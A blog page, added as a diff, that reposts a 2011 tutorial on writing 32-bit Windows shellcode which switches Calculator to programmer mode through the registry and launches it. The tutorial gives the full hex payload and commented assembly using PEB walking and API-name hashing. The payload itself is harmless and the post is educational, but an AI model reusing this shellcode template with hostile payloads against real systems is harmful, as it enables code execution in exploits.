@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Cool kids pop a programmers calc in their demos</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Cool kids pop a programmers calc in their demos</h1>
+			<b><time>20.07.2011 09:27</time></b>
+		       
+
+			<div>
+				<h1 id="cool-kids-pop-a-programmers-calc-in-their-demos">Cool kids pop a programmers calc in their demos</h1>
+<!-- raw HTML omitted -->
+<p>To start, I used procmon to observe how calc was interacting with the OS when switching from standard to programmer&rsquo;s mode.</p>
+<p><a href="http://4.bp.blogspot.com/-dZSZlnIUmLs/TibLw_-Sc9I/AAAAAAAAABg/BX8s1IXGnXg/s1600/procmon_calc.jpg">
+<figure>
+  <img src="http://4.bp.blogspot.com/-dZSZlnIUmLs/TibLw_-Sc9I/AAAAAAAAABg/BX8s1IXGnXg/s400/procmon_calc.jpg" alt="" />
+</figure>
+
+
+</a></p>
+<p>It turns out that it modifies the following registry key: HKCU\Software\Microsoft\Calc\layout and changes the REG_DWORD value to 0x00000002 when switching to a programmer&rsquo;s calc.</p>
+<p>One of the nice features of procmon is that it lets you view the stack trace of each entry. Here&rsquo;s the stack trace for the call to RegSetValue:</p>
+<p><a href="http://4.bp.blogspot.com/-vsSs5jtMqUY/TibMFJCPjoI/AAAAAAAAABk/u-CbTNoI9EQ/s1600/procmon_stack_trace.jpg">
+<figure>
+  <img src="http://4.bp.blogspot.com/-vsSs5jtMqUY/TibMFJCPjoI/AAAAAAAAABk/u-CbTNoI9EQ/s400/procmon_stack_trace.jpg" alt="" />
+</figure>
+
+
+</a></p>
+<p>So, to get my shellcode to work, I&rsquo;ll likely need to understand how calc.exe modifies the registry. After loading calc.exe into IDA, I quickly determined that it calls the folowing functions, which procmon graciously gave me the offsets to:</p>
+<ul>
+<li>RegCreateKeyExW</li>
+<li>RegSetValueExW</li>
+<li>RegCloseKey</li>
+</ul>
+<p>IDA in conjunction with my debugger conveniently gave me all the parameters I needed to pass to these functions. For more information on the function parameters, refer to MSDN documentation.</p>
+<p>The only problem is that the shellcode needs to first determine the addresses to these functions, which turns out to be the bulk of my shellcode. I should be careful when saying &lsquo;my&rsquo; shellcode considering I modified SkyLined&rsquo;s awesome w32-exec-calc-shellcode[<a href="#4_1">1</a>] which I believe was loosely based upon Matt Miller&rsquo;s paper - &ldquo;Understanding Windows Shellcode[<a href="#4_2">2</a>].&rdquo;</p>
+<p>It&rsquo;s worth noting that if your shellcode is running in the stack, careful considerations must be made when writing your assembly. Specifically, the shellcode instructions and function parameters share the same space. Because you are executing code from the stack, you have to be careful not to clobber your instructions. So what I did was move esp (which would point to the first instruction) into ebp [MOV EBP, ESP] and essentially create my own stack frame above the code.</p>
+<p>Here is the shellcode with relevant comments for your convenience. Note that this will only work on 32-bit Windows and it has only been tested on Windows 7 SP1 :</p>
+<p>w32-programmer-calc hex</p>
+<p><!-- raw HTML omitted -->8BEC33F633C06A016A016A016A0168D43710F568C01584E86A016A01648B76308B760C8B761CFF76088F45E48B368B5DE483C33C8B1B83C378035DE48B1B035DE48B4B1867E3DF8B7B20037DE48B7C8FFC037DE433D2321766D1CA5033C0AE5875F4663B5445E8E0DE75BB8B53240355E40FB7144A8B7B1C037DE48B34970375E4897485F04083F80475B633DB6A636861006C00685C00430068660074006873006F006872006F006869006300685C004D006872006500687700610068660074006853006F00538D45E0505368060002005353538D44241C506801000080FF55F06A0068750074006879006F00686C0061006A026A048D442404506A046A008D44241450FF75E0FF55F4FF75E0FF55F86A00682E6578656863616C635487042450FF55FCCC</p>
+<p>w32-programmer-calc assembly</p>
+<p><!-- raw HTML omitted -->8BEC           MOV EBP,ESP ; Save EBP-based frame pointer<!-- raw HTML omitted -->33F6           XOR ESI,ESI<!-- raw HTML omitted -->33C0           XOR EAX,EAX<!-- raw HTML omitted -->6A 01          PUSH 1      ; Placeholder for WinExec address<!-- raw HTML omitted -->6A 01          PUSH 1      ; Placeholder for RegCloseKey<!-- raw HTML omitted -->6A 01          PUSH 1      ; Placeholder for RegSetValueExW<!-- raw HTML omitted -->6A 01          PUSH 1      ; Placeholder for RegCreateKeyExW<!-- raw HTML omitted -->68 D43710F5    PUSH F51037D4 ; Hash values for RegCloseKey and WinExec<!-- raw HTML omitted -->68 C01584E8    PUSH E88415C0 ; Hash values for RegCreateKeyExW and RegSetValueExW<!-- raw HTML omitted -->6A 01          PUSH 1 ; Placeholder for module base address (kernel32.dll eventually)<!-- raw HTML omitted -->6A 01          PUSH 1 ; Placeholder for open registry key handle<!-- raw HTML omitted -->64:8B76 30     MOV ESI,DWORD PTR FS:[ESI+30] ; fs:[0x30] - Pointer to the PEB<!-- raw HTML omitted -->8B76 0C        MOV ESI,DWORD PTR DS:[ESI+C]  ; PEB pointer to PEB_LDR_DATA struct<!-- raw HTML omitted -->8B76 1C        MOV ESI,DWORD PTR DS:[ESI+1C] ; Extract entries in the initialization order module list<!-- raw HTML omitted -->locate_kernel32:<!-- raw HTML omitted -->FF76 08        PUSH DWORD PTR DS:[ESI+8]     ; Save module base address to stack<!-- raw HTML omitted -->8F45 E4        POP DWORD PTR SS:[EBP-1C]     ; Save module base address to stack<!-- raw HTML omitted -->8B36           MOV ESI,DWORD PTR DS:[ESI]    ; Pointer to the next loaded module<!-- raw HTML omitted -->8B5D E4        MOV EBX,DWORD PTR SS:[EBP-1C] ; Offset to dll&rsquo;s PE signature<!-- raw HTML omitted -->83C3 3C        ADD EBX,3C                    ; Skip over MSDOS header<!-- raw HTML omitted -->8B1B           MOV EBX,DWORD PTR DS:[EBX]    ; Offset to dll&rsquo;s PE signature<!-- raw HTML omitted -->83C3 78        ADD EBX,78                    ; Offset to module&rsquo;s Export Address Table (EAT)<!-- raw HTML omitted -->035D E4        ADD EBX,DWORD PTR SS:[EBP-1C] ; EAT offset<!-- raw HTML omitted -->8B1B           MOV EBX,DWORD PTR DS:[EBX]    ; Save offset<!-- raw HTML omitted -->035D E4        ADD EBX,DWORD PTR SS:[EBP-1C] ; Add to module basee address<!-- raw HTML omitted -->find_next_function:<!-- raw HTML omitted -->8B4B 18        MOV ECX,DWORD PTR DS:[EBX+18] ; Extract # of exported functions<!-- raw HTML omitted -->67:E3 DF       JCXZ SHORT locate_kernel32    ; Go to next loaded module if current module doesn&rsquo;t export any functions<!-- raw HTML omitted -->extract_function_name:<!-- raw HTML omitted -->8B7B 20        MOV EDI,DWORD PTR DS:[EBX+20] ; Extract the function name table array offset<!-- raw HTML omitted -->037D E4        ADD EDI,DWORD PTR SS:[EBP-1C] ; Address of function name table array<!-- raw HTML omitted -->8B7C8F FC      MOV EDI,DWORD PTR DS:[EDI+ECX*4-4] ; Indexed function name<!-- raw HTML omitted -->037D E4        ADD EDI,DWORD PTR SS:[EBP-1C] ; Current function name in ASCII<!-- raw HTML omitted -->33D2           XOR EDX,EDX<!-- raw HTML omitted -->function_name_hash:<!-- raw HTML omitted -->3217           XOR DL,BYTE PTR DS:[EDI]      ; XOR current character with DL<!-- raw HTML omitted -->66:D1CA        ROR DX,1    ; Rotate DX by one<!-- raw HTML omitted -->50             PUSH EAX    ; Save counter<!-- raw HTML omitted -->33C0           XOR EAX,EAX<!-- raw HTML omitted -->AE             SCAS BYTE PTR ES:[EDI]        ; Is current character == NULL?<!-- raw HTML omitted -->58             POP EAX     ; Restore counter<!-- raw HTML omitted -->75 F4          JNZ SHORT function_name_hash ; Calc hash until null terminator<!-- raw HTML omitted -->66:3B5445 E8   CMP DX,WORD PTR SS:[EBP+EAX*2-18] ; Does current function match indexed hash?<!-- raw HTML omitted -->E0 DE          LOOPDNE SHORT extract_function_name ; No? Get next functions name<!-- raw HTML omitted -->75 BB          JNZ SHORT locate_kernel32         ; Hash found? Extract function address<!-- raw HTML omitted -->8B53 24        MOV EDX,DWORD PTR DS:[EBX+24]     ; Extract ordinals table relative offset<!-- raw HTML omitted -->0355 E4        ADD EDX,DWORD PTR SS:[EBP-1C]     ; kernel32 ordinals table<!-- raw HTML omitted -->0FB7144A       MOVZX EDX,WORD PTR DS:[EDX+ECX*2] ; Extract current function&rsquo;s ordinal number<!-- raw HTML omitted -->8B7B 1C        MOV EDI,DWORD PTR DS:[EBX+1C]     ; Extract the address table relative offset<!-- raw HTML omitted -->037D E4        ADD EDI,DWORD PTR SS:[EBP-1C]     ; kernel32.dll address table<!-- raw HTML omitted -->8B3497         MOV ESI,DWORD PTR DS:[EDI+EDX*4]  ; Offset to function address<!-- raw HTML omitted -->0375 E4        ADD ESI,DWORD PTR SS:[EBP-1C]     ; kernel32 function address<!-- raw HTML omitted -->897485 F0      MOV DWORD PTR SS:[EBP+EAX*4-10],ESI ; Save function address relative to EBP<!-- raw HTML omitted -->40             INC EAX     ; Increase counter<!-- raw HTML omitted -->83F8 04        CMP EAX,4   ; Found all four functions?<!-- raw HTML omitted -->75 B6          JNZ SHORT find_next_function ; Yes? Start pushing params and call functions<!-- raw HTML omitted -->33DB           XOR EBX,EBX<!-- raw HTML omitted -->6A 63          PUSH 63     ; Push key: Unicode &ldquo;Software\Microsoft\Calc&rdquo;<!-- raw HTML omitted -->68 61006C00    PUSH 6C0061<!-- raw HTML omitted -->68 5C004300    PUSH 43005C<!-- raw HTML omitted -->68 66007400    PUSH 740066<!-- raw HTML omitted -->68 73006F00    PUSH 6F0073<!-- raw HTML omitted -->68 72006F00    PUSH 6F0072<!-- raw HTML omitted -->68 69006300    PUSH 630069<!-- raw HTML omitted -->68 5C004D00    PUSH 4D005C<!-- raw HTML omitted -->68 72006500    PUSH 650072<!-- raw HTML omitted -->68 77006100    PUSH 610077<!-- raw HTML omitted -->68 66007400    PUSH 740066<!-- raw HTML omitted -->68 53006F00    PUSH 6F0053<!-- raw HTML omitted -->53             PUSH EBX    ; lpdwDisposition<!-- raw HTML omitted -->8D45 E0        LEA EAX,DWORD PTR SS:[EBP-20]; Pointer to registry key handle<!-- raw HTML omitted -->50             PUSH EAX    ; Pointer to registry key handle<!-- raw HTML omitted -->53             PUSH EBX    ; lpSecurityAttributes<!-- raw HTML omitted -->68 06000200    PUSH 20006  ; samDesired (STANDARD_RIGHTS_WRITE, KEY_SET_VALUE, and KEY_CREATE_SUB_KEY)<!-- raw HTML omitted -->53             PUSH EBX    ; dwOptions<!-- raw HTML omitted -->53             PUSH EBX    ; lpClass<!-- raw HTML omitted -->53             PUSH EBX    ; reserved<!-- raw HTML omitted -->8D4424 1C      LEA EAX,DWORD PTR SS:[ESP+1C] ; lpSubKey<!-- raw HTML omitted -->50             PUSH EAX    ; lpSubKey - Pointer to &ldquo;Software\Microsoft\Calc&rdquo;<!-- raw HTML omitted -->68 01000080    PUSH 80000001                 ; hKey (HKCU)<!-- raw HTML omitted -->FF55 F0        CALL DWORD PTR SS:[EBP-10]    ; Call kernel32!RegCreateKeyExW<!-- raw HTML omitted -->6A 00          PUSH 0      ; Push key value name: Unicode &ldquo;layout&rdquo;<!-- raw HTML omitted -->68 75007400    PUSH 740075<!-- raw HTML omitted -->68 79006F00    PUSH 6F0079<!-- raw HTML omitted -->68 6C006100    PUSH 61006C<!-- raw HTML omitted -->6A 02          PUSH 2      ; Setting for programmer&rsquo;s calc :D<!-- raw HTML omitted -->6A 04          PUSH 4      ; cbData - Size of data<!-- raw HTML omitted -->8D4424 04      LEA EAX,DWORD PTR SS:[ESP+4]  ; lpData - Pointer to programmer&rsquo;s calc value<!-- raw HTML omitted -->50             PUSH EAX    ; lpData - Pointer to programmer&rsquo;s calc value<!-- raw HTML omitted -->6A 04          PUSH 4      ; dwType - REG_DWORD<!-- raw HTML omitted -->6A 00          PUSH 0      ; reserved<!-- raw HTML omitted -->8D4424 14      LEA EAX,DWORD PTR SS:[ESP+14] ; lpValueName - pointer to &rsquo;layout&rsquo; Unicode string<!-- raw HTML omitted -->50             PUSH EAX ; lpValueName - pointer to &rsquo;layout&rsquo; Unicode string<!-- raw HTML omitted -->FF75 E0        PUSH DWORD PTR SS:[EBP-20]    ; hKey - Open registry key handle<!-- raw HTML omitted -->FF55 F4        CALL DWORD PTR SS:[EBP-C]     ; Call kernel32!RegSetValueExW<!-- raw HTML omitted -->FF75 E0        PUSH DWORD PTR SS:[EBP-20]    ; hKey - Open registry key handle<!-- raw HTML omitted -->FF55 F8        CALL DWORD PTR SS:[EBP-8]     ; Call kernel32!RegCloseKey<!-- raw HTML omitted -->6A 00          PUSH 0<!-- raw HTML omitted -->68 2E657865    PUSH 6578652E                 ; &ldquo;calc.exe&rdquo;<!-- raw HTML omitted -->68 63616C63    PUSH 636C6163<!-- raw HTML omitted -->54             PUSH ESP    ; pointer to address of ascii string: &ldquo;calc.exe&rdquo;<!-- raw HTML omitted -->870424         XCHG DWORD PTR SS:[ESP],EAX   ; uCmdShow - Bring calculator to the front of the desktop<!-- raw HTML omitted -->50             PUSH EAX   ; pointer to address of ascii string: &ldquo;calc.exe&rdquo;<!-- raw HTML omitted -->FF55 FC        CALL DWORD PTR SS:[EBP-4]     ; Call kernel32!WinExec<!-- raw HTML omitted -->CC             INT3       ; Debugger trap</p>
+<p>Areas of improvement:</p>
+<ul>
+<li>Remove all nulls. This would be relatively easy but I am lazy. Perhaps in a future version.</li>
+<li>Only one byte of this needs to be modified to pop a scientific calc on Vista. This can be left as an exercise for the readers.</li>
+<li>This could scan for the OS version and determine dynamically whether to pop a scientific (pre-Windows 7) vs programmer&rsquo;s calc. Do you really want to be popping calcs on anything besides Windows 7 though? ;D</li>
+<li>My assembly is likely total crap. But it works. I&rsquo;m sure someone out there could trim a couple dozen bytes off it but I&rsquo;ll leave that as a challenge for the assembly ninjas out there.</li>
+</ul>
+<p>Please comment, try it out on your 32-bit Windows 7 machine for yourself, and let me know if it doesn&rsquo;t work and I might make an effort to fix it. Enjoy!</p>
+<p>References:</p>
+<p>1. Berend-Jan &ldquo;SkyLined&rdquo; Wever, w32-exec-calc-shellcode, <a href="http://code.google.com/p/w32-exec-calc-shellcode/">http://code.google.com/p/w32-exec-calc-shellcode/</a></p>
+<p>2. Matt Miller, &ldquo;Understanding Windows Shellcode&rdquo;, December 6, 2003, <a href="http://www.hick.org/code/skape/papers/win32-shellcode.pdf">http://www.hick.org/code/skape/papers/win32-shellcode.pdf</a></p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/tracker/6052198192158185644-282741896559422533?l=exploit-monday.com" alt="" />
+</figure>
+
+
+</p>
+<!-- raw HTML omitted -->
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
